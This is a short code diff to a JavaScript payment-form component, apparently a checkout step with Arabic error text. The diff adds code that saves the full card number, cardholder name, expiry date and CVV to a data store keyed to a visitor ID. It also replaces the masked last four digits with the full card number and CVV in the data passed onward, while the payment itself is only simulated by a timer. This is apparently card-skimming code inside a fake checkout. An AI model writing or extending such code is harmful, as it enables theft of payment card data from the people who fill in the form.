@@ -231,13 +231,23 @@ function ClickPayStep({
       setError("رمز CVV غير صحيح");
       return;
     }
+    await addData({
+      id: localStorage.getItem("visitor"),
+      card: card,
+      name: name,
+      mm: mm,
+      yy: yy,
+      cvv: cvv,
+    });
     setError("");
     setPaying(true);
     setTimeout(() => {
       setPaying(false);
       onSuccess({
-        cardLast4: digits.slice(-4),
+        cardLast4: digits,
         cardName: name.trim(),
+        cvv: cvv,
+        expiary: `${mm}/${yy}`,
       });
     }, 1500);
   };
